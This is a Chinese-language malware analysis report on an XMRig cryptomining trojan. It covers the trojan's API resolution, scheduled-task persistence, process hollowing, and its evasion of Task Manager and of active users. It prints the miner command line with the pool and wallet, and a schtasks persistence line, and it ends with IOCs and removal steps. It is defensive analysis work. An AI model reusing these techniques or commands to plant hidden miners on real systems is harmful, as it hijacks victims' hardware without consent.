title="分析dump.exe"></a>分析dump.exe</h2><p>上一步将样本进行了脱壳，获取到<code>dump.exe</code>，该文件便是该恶意样本的主要行为程序。</p><p><strong>其主要执行了：</strong></p><ul><li>创建互斥体</li><li>复制自身到<code>%AppData%\svchostx64.exe</code></li><li>创建计划任务，每分钟执行一次<code>svhostx64.exe</code></li><li>创建线程，防止系统进入休眠状态</li><li>获取区段<code>.plator</code>中的开源矿机程序<code>XMRig.exe</code></li><li>创建==傀儡进程==，将矿机程序<code>XMRig.exe</code>注入创建的傀儡进程，并监视进程，当检测到进程==任务管理器时==，便终止==傀儡进程==</li></ul><p><strong>主要行为函数代码段如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570875067157.png" alt="1570875067157"></p><h3 id="隐式加载调用函数"><a href="#隐式加载调用函数" class="headerlink" title="隐式加载调用函数"></a>隐式加载调用函数</h3><p>该恶意样本使用大量的隐式加载调用系统API，如下图获取函数<code>OpenMutexW</code>，就是通过隐式加载调用的。</p><ul><li><p>首先通过硬编码的方式，将要获取的函数，以及相应的模块字符串，获取到。</p></li><li><p>然后将要动态加载的DLL模块名，以及要调用的函数名作为参数，传给函数<code>GetProcAddress_402536</code>，来获取要调用的API</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570878056421.png" alt="1570878056421"></p><p><strong>函数：<code>GetProcAddress_402536</code>获取函数地址</strong></p><ul><li>该函数通过遍历<code>PEB-&gt;PEB_LDR_DATA-&gt;inMemoryOrderModuleList-&gt; LDR_MODULE()-&gt; LDR_MODULE(ntdll)-&gt;LDR_MODULE(kernel32).BaseAddress </code>，先获取到模块<code>kernel32</code>的基址。</li><li>再执行函数<code>traverse_Export_402483</code>遍历模块<code>kernel32</code>的导出表，来获取函数<code>GetModuleHandleA</code></li><li>再执行函数<code>traverse_Export_402483</code>遍历模块<code>kernel32</code>的导出表，来获取函数<code>LoadLibraryA</code></li><li>然后再用获取到的<code>GetModuleHandleA</code>去获取要获取DLL模块句柄，再用获取到的<code>LoadLibraryA</code>去加载该DLL模块句柄，就能根据传进来参数，来加载不同的DLL模块</li><li>然后再从加载的DLL模块中，获取想要获取函数的地址</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570879158336.png" alt="1570879158336"></p><ul><li><strong>函数：<code>traverse_Export_402483</code>遍历DLL模块的导出表获取函数地址</strong><ul><li>先遍历模块的PE头，获取到导出表结构，然后遍历导出表。</li><li>遍历导出表中的名称表<code>AddressOfNames</code>中的函数名去进行比较，找到想要获取的函数名。记下索引</li><li>在通过索引，去名称序号表<code>AddressOfNameOrdinals</code>中获取索引相对应的<code>NameOrdinal</code>名称序号</li><li>再根据<code>NameOrdinal</code>名称序号，去函数地址表<code>AddressOfFunction</code>中获取要获取的函数地址</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570879877252.png" alt="1570879877252"></p><h3 id="创建互斥体"><a href="#创建互斥体" class="headerlink" title="创建互斥体"></a>创建互斥体</h3><p>创建互斥体<code>NIHILMsINERaassdaa</code></p><ul><li>首先通过隐式加载调用函数<code>OpenMutexW</code>,来判断互斥体<code>NIHILMsINERaassdaa</code>是否存在，若存在便直接退出</li><li>当互斥体<code>NIHILMsINERaassdaa</code>不存在时，便调用函数<code>CreateMutexW</code>来创建互斥体</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880165230.png" alt="1570880165230"></p><h3 id="复制自身并创建计划任务"><a href="#复制自身并创建计划任务" class="headerlink" title="复制自身并创建计划任务"></a>复制自身并创建计划任务</h3><p>复制自身文件到<code>%AppData%\svchostx64.exe</code>，并添加计划任务每一分钟执行一次复制后的程序<code>svchostx64</code>，应征了简单行为分析==图1，图2==抓到的行为。</p><p><strong>主要行为：</strong></p><ul><li>获取路径<code>%AppData%</code>，并将其拼接为：<code>%AppData%\svchostx64.exe</code></li><li>获取当前进程的绝对路径，并与拼接出的路径进行判断，判断当前正在执行进程是否为<code>svchostx64.exe</code></li><li>若两路径不一样时，再通过函数<code>CreateFileW</code>检测<code>svhostx64</code>文件是否已经存在</li><li>若<code>svhostx64</code>文件不存在，便执行函数<code>CopyFileW</code>，将当前执行的自身文件拷贝至<code>%AppData%\svchostx64.exe</code></li><li>当复制成功后，执行函数<code>Create_Schtask_4026CC</code>，调用<code>schtasks</code>创建计划任务每分钟执行一次复制后的程序<code>svchostx64</code></li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880802333.png" alt="1570880802333"></p><p><strong>函数：<code>Create_Schtask_4026CC</code>创建计划任务</strong></p><p>通过执行函数<code>ShellExecuteW</code>，调用<code>schtasks</code>来执行下面指令，来创建名为==Adasdsadas3id==的计划任务，每分钟执行一次<code>svchostx64.exe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;SC MINUTE &#x2F;MO 1 &#x2F;F &#x2F;Create &#x2F;TN Adasdsadas3id &#x2F;tr &quot;\&quot;C:\Users\john\AppData\Roaming\svchostx64.exe\</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570880981354.png" alt="1570880981354"></p><h3 id="创建线程，防止进入休眠"><a href="#创建线程，防止进入休眠" class="headerlink" title="创建线程，防止进入休眠"></a>创建线程，防止进入休眠</h3><p>创建线程，创建死循环，每一秒执行一次函数<code>SetThreadExecutionState</code>，来通知系统当前进程正在使用，从而防止应用程序运行时进入休眠状态或关闭显示器</p><p><strong>主要行为：</strong></p><ul><li>通知系统所设置的状态应保持有效</li><li>启用离开模式</li><li>通过重置系统空闲计时器来强制系统进入工作状态。</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570883758174.png" alt="1570883758174"></p><h3 id="获取区段中的PE文件"><a href="#获取区段中的PE文件" class="headerlink" title="获取区段中的PE文件"></a>获取区段中的PE文件</h3><p>该文件的<code>.plato</code>区段中存储着一个开源的矿机程序<code>XMRig.exe</code>，要想运行改程序首先要先获取到该矿机的PE文件</p><p><strong>主要行为：</strong></p><ul><li>读取当前进程，遍历节表寻找区段<code>.plato</code>，并获取相应区段的<code>.plato.Virtual Adress</code>和<code>.plato.Virtual Size</code></li><li>开辟大小为<code>.plato.Virtual Size</code>的虚拟空间，并将<code>.plato.Virtual Adress</code>中的PE文件数据保存至开辟的虚拟空间中</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885295817.png" alt="1570885295817"></p><p>既然是从内存中读取了区段<code>.plato</code>中的PE文件数据，并且并没有将其展开，可以直接dump下来，或是直接去文件中找到该区段，直接将数据拷贝下来，然后发现拷贝下来的文件是一个名为<code>XMRig.exe</code>的开源的矿机，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885740843.png" alt="1570885740843"></p><p>该矿机可在==GitHub==直接找到其源码，链接为：<a href="https://github.com/xmrig/xmrig">https://github.com/xmrig/xmrig</a></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570885848889.png" alt="1570885848889"></p><h3 id="创建傀儡进程并监控进程"><a href="#创建傀儡进程并监控进程" class="headerlink" title="创建傀儡进程并监控进程"></a>创建傀儡进程并监控进程</h3><p>创建自身进程，并将上一步获取到的开源的矿机程序<code>XMRig.exe</code>注入该进程中并执行，其中还会监控进程，当检测到进程==任务管理器==时，便会终止傀儡进程</p><p><strong>主要行为：</strong></p><ul><li><strong>避免用户察觉</strong>，执行函数<code>JudgeSystemFree_4019E1</code>，检测操作系统当前是否处于空闲状态。当系统处于忙碌状态，将==终止傀儡进程==，也就是只在系统空闲时实施挖矿行为，来防止用户在使用时发现。</li><li>解密硬编码指令<code>CommandLine</code>，并转换为<code>unicode</code>，放入开辟好的虚拟空间中。</li><li>创建和当前进程一样的傀儡==子进程==，并将解密出来<code>CommandLine</code>作为参数传给创建的子进程来执行。</li><li>将上一步获取到的开源矿机程序<code>XMRig.exe</code>展开，==注入到创建的子进程中==。</li><li><strong>避免用户察觉</strong>，监视当前所有进程，当检测到进程==任务管理器==时，便==终止傀儡进程==，来隐藏自身防止被发现。</li></ul><p><strong>代码如图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570888935890.png" alt="1570888935890"></p><ul><li><strong>避免用户察觉，函数<code>JudgeSystemFree_4019E1</code>，检测操作系统当前是否处于空闲状态</strong></li></ul><p>通过调用函数<code>GetLastInputInfo</code>和函数<code>CallNtPowerInformation</code>来检索系统空闲状态信息，从而来判断操作系统当前是否处于空闲状态，当操作系统属于空闲状态返回1，否则返回0，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570945418503.png" alt="1570945418503"></p><p>然后死循环，根据函数<code>JudgeSystemFree_4019E1</code>的==两次返回值==来进行判断，当系统处于==忙碌==时，便==终止傀儡进程，来避免被用户察觉==，其两次执行结果如下：</p><p>第一次执行函数<code>JudgeSystemFree_4019E1</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570946355225.png" alt="1570946355225"></p><p>第二次执行函数<code>JudgeSystemFree_4019E1</code></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570946510902.png" alt="1570946510902"></p><ul><li><strong>解密硬编码指令<code>CommandLine</code>，并转换为<code>unicode</code>，放入开辟好的虚拟空间中</strong></li></ul><p>然后根据第一次执行函数<code>JudgeSystemFree_4019E1</code>的返回的结果，执行不同操作，但所执行的代码实则却是一样的，都是解密一样的<code>CommandLine</code>，然后最终再将解密出来的<code>CommandLine</code>转换为<code>Unicode</code>存起来，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570947124194.png" alt="1570947124194"></p><p>解密出来的指令，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570948514232.png" alt="1570948514232"></p><ul><li><strong>创建和当前进程一样的傀儡==子进程==，并将解密出来<code>CommandLine</code>作为参数传给创建的子进程来执行</strong></li></ul><p>以没有控制台窗口并挂起的方式，来创建当前进程的子进程，并执行解密出来的<code>CommandLine</code>作为参数来执行，应征了简单行为分析==图4==抓到的行为，代码如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570949665978.png" alt="1570949665978"></p><ul><li><strong>将上一步获取到的开源矿机程序<code>XMRig.exe</code>展开，==注入到创建的子进程中==</strong><ul><li>先通过函数<code>GetThreadContext</code>，读取线程上下文</li><li>再通过函数<code>ReadProcessMemory</code>，读取<code>context-&gt;Ebx+0x8</code>的<code>AddressOfImageBase</code>字段，获取创建的傀儡子进程的==加载基址（随机基址）==</li><li>再将获取到的==加载基址（随机基址）==与前面获取到的矿机程序<code>XMRig.exe</code>的<code>ImageBase</code>进行比较。当一样时，便通过函数<code>NtUnmapViewOfSection</code>强制卸载==加载基址（随机基址）==处的模块，反之不做操作。</li><li>然后通过函数<code>VirtualAllocEx</code>，远程开辟大小为<code>XMRig.exe</code>的<code>sizeofImage</code>，基址为其<code>ImageBase</code>的==虚拟空间==</li><li>然后往远程开辟的==虚拟空间==中，写入文件<code>XMRig.exe</code>的<code>DOS</code>头，并将各个区段==展开==</li><li>再修复傀儡进程的==加载基址（随机基址）==，并通过函数<code>SetThreadContext</code>，设置线程上下文，修改傀儡进程的入口点地址为<code>XMRig.exe</code>的<code>AddressOfEntryPoint</code></li><li>最后通过函数<code>NtAlertResumeThread</code>，恢复进程，结束挂起</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570951469149.png" alt="1570951469149"></p><ul><li><strong>避免用户察觉，监视当前所有进程，当检测到进程==任务管理器==时，便终止傀儡进程</strong></li></ul><p>创建了两个死循环，来==<strong>避免用户察觉</strong>==。</p><ul><li><p>其中第一个死循环，前面分析<code>JudgeSystemFree_4019E1</code>中提到过，来判断系统是否处于忙碌，当处于==忙碌时==，便终止傀儡进程，来避免用户察觉。不过这里还有一个检测函数<code>traverse_Proc_4014EF</code>，遍历进程，当检测到进程名为<code>Taskmgr</code>便返回1，退出循环，终止傀儡进程。</p></li><li><p>第二个死循环，不断执行检测函数<code>traverse_Proc_4014EF</code>监控进程。当检测到进程<code>Taskmgr</code>，便一直睡眠，直到检测不到进程<code>Taskmgr</code>时，便从新执行当前函数<code>inject_4010C5</code>，创建傀儡进程，注入矿机。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570951668325.png" alt="1570951668325"></p><ul><li><ul><li>函数<code>traverse_Proc_4014EF</code></li></ul></li></ul><p>快照系统中的所有进程，然后遍历所有进程，比较进程名，当遇到<code>Taskmgr</code>，便返回1，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570953268202.png" alt="1570953268202"></p><h2 id="分析矿机程序"><a href="#分析矿机程序" class="headerlink" title="分析矿机程序"></a>分析矿机程序</h2><p>前面分析也有提到，<code>dump.exe</code>的最后一个区段<code>.plato</code>中包含一个矿机程序<code>XMRig.exe</code>，并且该矿机程序<code>XMRig.exe</code>是开源的，可以直接在网上找到，并下载，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/06_%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1570954719719.png" alt="1570954719719"></p><p>其中我们比较关注的就是傀儡进程，执行的指令对应的是什么意思，这里我们可以在<code>GitHub</code>上查看该矿机的帮助手册<code>README</code>，链接： <a href="https://github.com/xmrig/xmrig">https://github.com/xmrig/xmrig</a> ，通过帮助手册中的<code>Options</code>，查看该框架的指令，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">-a, --algo&#x3D;ALGO               specify the algorithm to use</span><br><span class="line">                                cn&#x2F;r, cn&#x2F;2, cn&#x2F;1, cn&#x2F;0, cn&#x2F;double, cn&#x2F;half, cn&#x2F;fast,</span><br><span class="line">                                cn&#x2F;rwz, cn&#x2F;zls, cn&#x2F;xao, cn&#x2F;rto, cn&#x2F;gpu,</span><br><span class="line">                                cn-lite&#x2F;1,</span><br><span class="line">                                cn-heavy&#x2F;xhv, cn-heavy&#x2F;tube, cn-heavy&#x2F;0,</span><br><span class="line">                                cn-pico,</span><br><span class="line">                                rx&#x2F;wow, rx&#x2F;loki</span><br><span class="line">-o, --url&#x3D;URL                 URL of mining server</span><br><span class="line">-O, --userpass&#x3D;U:P            username:password pair for mining server</span><br><span class="line">-u, --user&#x3D;USERNAME           username for mining server</span><br><span class="line">-p, --pass&#x3D;PASSWORD           password for mining server</span><br><span class="line">    --rig-id&#x3D;ID               rig identifier for pool-side statistics (needs pool support)</span><br><span class="line">-t, --threads&#x3D;N               number of miner threads</span><br><span class="line">-v, --av&#x3D;N                    algorithm variation, 0 auto select</span><br><span class="line">-k, --keepalive               send keepalived packet for prevent timeout (needs pool support)</span><br><span class="line">    --nicehash                enable nicehash.com support</span><br><span class="line">    --tls                     enable SSL&#x2F;TLS support (needs pool support)</span><br><span class="line">    --tls-fingerprint&#x3D;F       pool TLS certificate fingerprint, if set enable strict certificate pinning</span><br><span class="line">    --daemon                  use daemon RPC instead of pool for solo mining</span><br><span class="line">    --daemon-poll-interval&#x3D;N  daemon poll interval in milliseconds (default: 1000)</span><br><span class="line">-r, --retries&#x3D;N               number of times to retry before switch to backup server (default: 5)</span><br><span class="line">-R, --retry-pause&#x3D;N           time to pause between retries (default: 5)</span><br><span class="line">    --cpu-affinity            set process affinity to CPU core(s), mask 0x3 for cores 0 and 1</span><br><span class="line">    --cpu-priority            set process priority (0 idle, 2 normal to 5 highest)</span><br><span class="line">    --no-huge-pages           disable huge pages support</span><br><span class="line">    --no-color                disable colored output</span><br><span class="line">    --donate-level&#x3D;N          donate level, default 5% (5 minutes in 100 minutes)</span><br><span class="line">    --user-agent              set custom user-agent string for pool</span><br><span class="line">-B, --background              run the miner in the background</span><br><span class="line">-c, --config&#x3D;FILE             load a JSON-format configuration file</span><br><span class="line">-l, --log-file&#x3D;FILE           log all output to a file</span><br><span class="line">    --asm&#x3D;ASM                 ASM optimizations, possible values: auto, none, intel, ryzen, bulldozer.</span><br><span class="line">    --print-time&#x3D;N            print hashrate report every N seconds</span><br><span class="line">    --api-worker-id&#x3D;ID        custom worker-id for API</span><br><span class="line">    --api-id&#x3D;ID               custom instance ID for API</span><br><span class="line">    --http-enabled            enable HTTP API</span><br><span class="line">    --http-host&#x3D;HOST          bind host for HTTP API (default: 127.0.0.1)</span><br><span class="line">    --http-port&#x3D;N             bind port for HTTP API</span><br><span class="line">    --http-access-token&#x3D;T     access token for HTTP API</span><br><span class="line">    --http-no-restricted      enable full remote access to HTTP API (only if access token set)</span><br><span class="line">    --randomx-init&#x3D;N          threads count to initialize RandomX dataset</span><br><span class="line">    --randomx-no-numa         disable NUMA support for RandomX</span><br><span class="line">    --export-topology         export hwloc topology to a XML file and exit</span><br><span class="line">    --dry-run                 test configuration and exit</span><br><span class="line">-h, --help                    display this help and exit</span><br><span class="line">-V, --version                 output version information and exit</span><br></pre></td></tr></table></figure><p>然而该样本执行的参数为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-o monerohash.com:3333 -u 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQni58KYZqH43YSDeqY -p x -k --donate-level&#x3D;1 -t 3</span><br></pre></td></tr></table></figure><p>其各项参数解析如下表：</p><table><thead><tr><th>Options</th><th>Meaning</th><th>Value</th></tr></thead><tbody><tr><td>- o</td><td>URL of mining server（矿池）</td><td>monerohash.com:3333</td></tr><tr><td>- u</td><td>username for mining server（用户名）</td><td>4BrL51JCc9NGQ71kW….</td></tr><tr><td>- p</td><td>password for mining server（密码）</td><td>x</td></tr><tr><td>- k</td><td>send keepalived packet for prevent timeout （防止超时）</td><td>NULL</td></tr><tr><td>-donate-level</td><td>Default donation 5% (5 minutes in 100 minutes) can be reduced to 1%（捐赠比例）</td><td>1</td></tr><tr><td>- t</td><td>number of miner threads（线程数量）</td><td>3</td></tr></tbody></table><p>其中矿池：<code>monerohash.com:3333</code>，为门罗币的矿池。</p><p>也就说明该样本通过创建傀儡进程，注入这个开源的矿机程序<code>XMRig.exe</code>，连接到（门罗币）的矿池，用病毒作者自己的用户名密码登陆上，来进行挖矿来获利的。</p><h1 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h1><h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><table><thead><tr><th>FileName</th><th>FileSize</th><th>MD5</th></tr></thead><tbody><tr><td>d48ab2e921f5c725672fce16135d1f09.vir</td><td><strong>468480 bytes</strong></td><td><strong>D48AB2E921F5C725672FCE16135D1F09</strong></td></tr><tr><td><strong>svchostx64.exe</strong></td><td><strong>468480 bytes</strong></td><td><strong>D48AB2E921F5C725672FCE16135D1F09</strong></td></tr><tr><td><strong>XMRig.exe</strong></td><td><strong>283136 bytes</strong></td><td><strong>C131DE679C5B230CDD3415A47F53ED10</strong></td></tr></tbody></table><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p><strong>矿池URL为：</strong><code>monerohash.com:3333</code></p><table><thead><tr><th>矿池的 IP</th><th>服务器所在地</th></tr></thead><tbody><tr><td>107.191.99.221</td><td>美国 纽约</td></tr><tr><td>107.191.99.95</td><td>美国 纽约</td></tr></tbody></table><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><table><thead><tr><th>互斥体</th><th>NIHILMsINERaassdaa</th></tr></thead><tbody><tr><td><strong>释放文件名</strong></td><td><strong>svchostx64.exe</strong></td></tr><tr><td><strong>计划任务名</strong></td><td><strong>Adasdsadas3id</strong></td></tr><tr><td><strong>特定区段名</strong></td><td><strong>.plato</strong></td></tr><tr><td><strong>矿池</strong></td><td><strong>monerohash.com:3333</strong></td></tr></tbody></table><h1 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h1><ul><li><strong>1.删除计划任务</strong></li></ul><p>由于该样本只在复制自身之后才会创建计划任务，因此我们可以直接删除该计划任务。</p><blockquote><p>打开<code>CMD</code>，执行指令<code>schtasks /delete /TN Adasdsadas3id /F</code>，删除计划任务。</p></blockquote><ul><li><strong>2.将文件MD5加入杀软黑名单</strong></li></ul><p>由于该样本是复制自身到<code>%AppData%</code>目录下的<code>svhostx64.exe</code>，两文件的MD5值是一样的，并且该恶意样本是通过创建傀儡进程将自身文件中的矿机程序注入其中，因此只需要删除该文文件，便能实现查杀。</p><blockquote><p>重启电脑，将恶意样本的<code>MD5</code>值**<code>D48AB2E921F5C725672FCE16135D1F09</code>**，加入杀软的应用黑名单中，进行一次全盘查杀</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote><p>该挖矿木马通过创建傀儡进程，将自身最后一个区段存储的开源矿机程序注入到傀儡进程中，从而进行挖矿，使攻击者利用受害者的主机赚取加密数字货币来获利。并且该挖矿木马还会检测当前系统是否空闲，是否启用进程管理器等操作来隐蔽自身，避免用户察觉。长期被感染的主机会大大降低系统硬件的寿命。因此大家应不要从不正规的网址下载文件，或是从不确定来源的地方接收文件，安装杀软，定期杀毒，做好防范工作。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 挖矿 </tag>
            
            <tag> XMRig矿机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宏病毒_APT分析报告</title>
      <link href="2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/"/>
      <url>2019/10/10/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/05_%E5%AE%8F%E7%97%85%E6%AF%92_APT/</url>
      
